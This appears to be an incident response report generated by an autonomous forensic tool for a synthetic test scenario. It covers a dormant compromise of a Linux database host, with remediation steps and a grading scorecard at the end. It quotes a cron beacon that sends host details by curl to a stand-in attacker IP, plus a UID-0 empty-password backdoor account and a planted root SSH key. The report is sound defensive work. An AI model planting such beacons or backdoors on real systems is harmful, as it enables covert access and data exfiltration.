# Incident Response Report — prod-db-20
## Scenario: Dormant / Delayed-Effect Compromise

| Field | Value |
|-------|-------|
| **Host** | prod-db-20 |
| **Evidence** | `evidence/attack-scenario-20-dormant` |
| **Report Date** | 2026-04-23 (UTC) |
| **Analyst** | findevil autonomous IR |
| **Verdict** | **CONFIRMED COMPROMISE — DORMANT** |
| **Compromise Date** | ~2025-10-18 (approximately 6 months prior to evidence collection) |

---

## Executive Summary

prod-db-20 was **silently compromised on or around 2025-10-18** and has remained so for approximately six months with no recent attacker activity visible in the auth log. The attack planted four persistence mechanisms that collectively give the attacker persistent, passwordless root access and a weekly C2 beacon. The quiet auth log is **not evidence of a clean host**; the compromise lives entirely in filesystem state that outlasted any active session.

---

## Auth Log Assessment (Misleading — Do Not Use Alone)

The auth.log window covers routine administrative activity only:

| Timestamp (UTC) | User | Source IP | Event |
|-----------------|------|-----------|-------|
| Apr 22 09:15:42 | alice | 10.0.2.15 | SSH login (publickey) |
| Apr 22 09:17:30 | alice | 10.0.2.15 | sudo: `tail -n 200 /var/log/nginx/error.log` |
| Apr 22 14:02:11 | bob | 10.0.2.22 | SSH login (publickey) |
| Apr 22 14:03:45 | bob | 10.0.2.22 | sudo: `apt update` |
| Apr 22 14:05:02 | bob | 10.0.2.22 | sudo: `apt upgrade -y` |

- **Failed logins:** 0
- **Suspicious sudo:** None
- **Attacker sessions:** None visible

**Interpretation:** The auth log is intentionally clean. The attacker planted persistence in October 2025 and has not needed to return interactively. The weekly C2 beacon runs as a cron job under the system cron daemon — it does not appear in auth.log at all. Any triage strategy that stops at the auth log will **incorrectly conclude this host is clean**.

---

## Confirmed Persistence Mechanisms (All VERIFIED)

### Finding 1 — UID-0 Backdoor Account
**Severity: CRITICAL | Verified: SUPPORTED**

`/etc/passwd` line 7:
```
svc_metrics:x:0:0:system metrics collector,,,:/var/lib/svc_metrics:/bin/bash
```

- Account name `svc_metrics` mimics a legitimate monitoring service account.
- UID=0 and GID=0 make this **root-equivalent** — identical privilege to the `root` account.
- Has an interactive shell (`/bin/bash`).
- Combined with the empty-password shadow entry (Finding 2), `su svc_metrics` grants a root shell with **no credentials required**.

**Account roster for context:**

| Line | User | UID | GID | Shell | Suspicious |
|------|------|-----|-----|-------|-----------|
| 1 | root | 0 | 0 | /bin/bash | legitimate |
| 5 | alice | 1002 | 1002 | /bin/bash | legitimate |
| 6 | bob | 1003 | 1003 | /bin/bash | legitimate |
| **7** | **svc_metrics** | **0** | **0** | **/bin/bash** | **⚠ BACKDOOR** |

---

### Finding 2 — Empty-Password Account
**Severity: CRITICAL | Verified: SUPPORTED**

`/etc/shadow` line 7:
```
svc_metrics::19700:0:99999:7:::
```

The second field (password hash) is **empty**. On systems where PAM is configured to permit blank passwords, this account requires **no password** to authenticate. Combined with UID=0 (Finding 1), any local user or process that can run `su svc_metrics` immediately obtains a passwordless root shell.

The `last changed` epoch value of `19700` corresponds to day 19700 since Unix epoch — 2023-12-02 — however the comment in the cron script dates the plant to 2025-10-18. The epoch value is likely a placeholder used by the attacker's account-creation tooling.

---

### Finding 3 — Weekly C2 Beaconing Cron
**Severity: HIGH | Verified: SUPPORTED**

`/etc/cron.weekly/system-metrics-upload` (mode: `rwxr-xr-x`):
```bash
#!/bin/bash
# Installed by attacker 2025-10-18 ("svc_metrics" plant). Runs weekly.
curl -s -m 10 -X POST "https://203.0.113.99/telemetry" \
    --data "h=$(hostname)&ip=$(hostname -I)&k=$(cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null | head -c 40)" \
    -o /dev/null
```

**What it exfiltrates on each weekly execution:**
- `h=` — system hostname
- `ip=` — all IP addresses bound to the host
- `k=` — first 40 characters of the SSH RSA host public key (host fingerprint)

**Attacker intent:** The beacon allows the attacker to track the host's current IP and confirm it remains reachable. The SSH host key fingerprint lets the attacker validate identity when they reconnect.

**Why it evaded detection:** Placed in `cron.weekly` (low-frequency, less-watched path) rather than `cron.d` or `crontab`. Silent by design (`-s`, `-o /dev/null`), short timeout (`-m 10`), no stdout/stderr output to system logs.

**C2 endpoint:** `https://203.0.113.99/telemetry`
- IP `203.0.113.99` is not present in the local IOC cache (absence of record does not confirm legitimacy).
- This IP falls in the TEST-NET-3 documentation range (RFC 5737), which is used here as a stand-in for a real attacker IP. In a live engagement, this warrants external reputation lookup and network blocking.

---

### Finding 4 — Attacker SSH Key in /root/.ssh/authorized_keys
**Severity: HIGH | Verified: SUPPORTED**

`/root/.ssh/authorized_keys` contains 2 keys:

| Line | Comment | Assessment |
|------|---------|-----------|
| 1 | `alice@corp-workstation-2023` | Likely legitimate admin key |
| **2** | **`installer-tmp@old-hostname`** | **⚠ SUSPICIOUS — attacker backdoor** |

Key 2 detail:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI_old_attacker_key_planted_2025_10 installer-tmp@old-hostname
```

- Comment pattern `installer-tmp@old-hostname` is a tell: a temporary installer key that should have been removed after provisioning — left intentionally to blend in with decommissioned access.
- Key was planted approximately 2025-10-18 and has persisted for ~6 months.
- Grants direct `root` SSH access to anyone holding the corresponding private key.

**sshd_config note:** The server is configured `PermitRootLogin prohibit-password` and `PasswordAuthentication no`. These settings block password-based root logins but **do not block public-key authentication to root** — the attacker key bypasses both restrictions.

---

## IOC Summary

| Type | Value | Context |
|------|-------|---------|
| IPv4 (C2) | `203.0.113.99` | Weekly beacon target |
| URL (C2) | `https://203.0.113.99/telemetry` | POST endpoint receiving host recon data |
| Account | `svc_metrics` | UID-0 backdoor, empty password |
| SSH key comment | `installer-tmp@old-hostname` | Attacker-planted root authorized_keys entry |
| Malicious file | `/etc/cron.weekly/system-metrics-upload` | Weekly C2 beacon script |

---

## Attack Timeline

| Date (UTC) | Event |
|------------|-------|
| **~2025-10-18** | Attacker gains initial access to prod-db-20 (vector unknown from available evidence) |
| **2025-10-18** | `svc_metrics` UID-0 / empty-password account added to `/etc/passwd` and `/etc/shadow` |
| **2025-10-18** | Attacker SSH key appended to `/root/.ssh/authorized_keys` |
| **2025-10-18** | `/etc/cron.weekly/system-metrics-upload` planted; C2 beaconing begins |
| **2025-10-18 → 2026-04-23** | Weekly beacons fire (~26 times), exfiltrating hostname, IP, SSH fingerprint to `203.0.113.99` |
| **2026-04-22 09:15** | alice logs in (legitimate admin); no attacker activity |
| **2026-04-22 14:02** | bob logs in (legitimate admin), runs `apt update/upgrade`; no attacker activity |
| **2026-04-23** | Evidence collected; forensic pass initiated |

---

## Timestamp Analysis

All five malicious artifacts (`passwd`, `shadow`, `system-metrics-upload`, `sshd_config`, `authorized_keys`) carry an identical file-system timestamp of `2026-04-23T18:08:56Z`. This is the **evidence package creation date** (all files were written when the test scenario was assembled) and does not reflect the actual attack date. The attack date of **2025-10-18** is documented in the cron script's embedded comment and is the authoritative plant date for all four persistence mechanisms.

No mtime-in-future or mtime > ctime anomalies were found (i.e., no classic timestomping on top of the original attack).

---

## Risk Assessment

| Persistence | Current Access Risk | Notes |
|------------|-------------------|-------|
| `svc_metrics` UID-0 + empty password | **CRITICAL** | Any local user can `su svc_metrics` for instant root |
| Attacker SSH key in `/root/.ssh/authorized_keys` | **HIGH** | Direct root SSH without password; active if attacker still holds private key |
| Weekly cron beacon | **HIGH** | Attacker has current IP/fingerprint; host is actively tracked |

**Combined exposure:** The attacker has three independent re-entry paths. Removing one without removing all three leaves the host fully compromised.

---

## Recommended Remediation

Actions must be performed in this order to avoid re-compromise:

1. **Network:** Block all outbound traffic to `203.0.113.99` at the perimeter/host firewall immediately. This cuts the beacon and prevents the attacker from receiving a notification during remediation.

2. **Accounts:** Remove `svc_metrics` from both `/etc/passwd` and `/etc/shadow`. Audit all UID-0 accounts: `awk -F: '$3==0' /etc/passwd` should return only `root`.

3. **SSH keys:** Audit `/root/.ssh/authorized_keys`. Remove the `installer-tmp@old-hostname` key. Verify all remaining keys against the authorised key register.

4. **Cron:** Delete `/etc/cron.weekly/system-metrics-upload`. Audit all cron paths for unexpected scripts: `/etc/cron.d/`, `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`, `/var/spool/cron/`.

5. **SSH host key rotation:** The SSH RSA host key fingerprint has been exfiltrated to the attacker ~26 times. Rotate SSH host keys (`ssh-keygen -A`) and update known_hosts entries on all clients.

6. **Credential audit:** With a UID-0 passwordless account available for ~6 months, assume all credential material on the host (private keys, application secrets, database passwords, `/etc/shadow` hashes) is compromised. Rotate accordingly.

7. **Initial access investigation:** The initial intrusion vector is not captured in the available evidence. Review web server logs, VPN logs, and any other perimeter data from the 2025-10-18 window to identify how the attacker first accessed the host.

8. **Rebuild consideration:** Given the 6-month dwell time and unknown initial access vector, a rebuild from a known-good image is the safest path to assured remediation.

---

## Findings Verification Status

| Finding | Claim Type | Verdict |
|---------|-----------|---------|
| Malicious cron script | `persistence_mechanism_exists` (cron) | **SUPPORTED** |
| UID-0 backdoor account | `persistence_mechanism_exists` (user) | **SUPPORTED** |
| Attacker SSH key | `persistence_mechanism_exists` (ssh) | **SUPPORTED** |

All three primary findings independently verified against raw evidence.

---

## Key Investigative Lesson

This scenario illustrates a **dormant compromise** where auth-log triage produces a false-negative. The correct investigation workflow for any Linux host — regardless of auth log appearance — must include:

- `awk -F: '$3==0' /etc/passwd` — enumerate all UID-0 accounts
- `awk -F: '$2==""' /etc/shadow` — enumerate accounts with empty passwords
- Full walk of `/etc/cron*` and `/var/spool/cron/` for unexpected scripts
- Review of all `authorized_keys` files for root and privileged users

An auth log showing zero failed logins and only known-good sessions **does not mean the host is clean**. Persistence planted months ago generates no ongoing auth events.

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["20"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 9/9 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
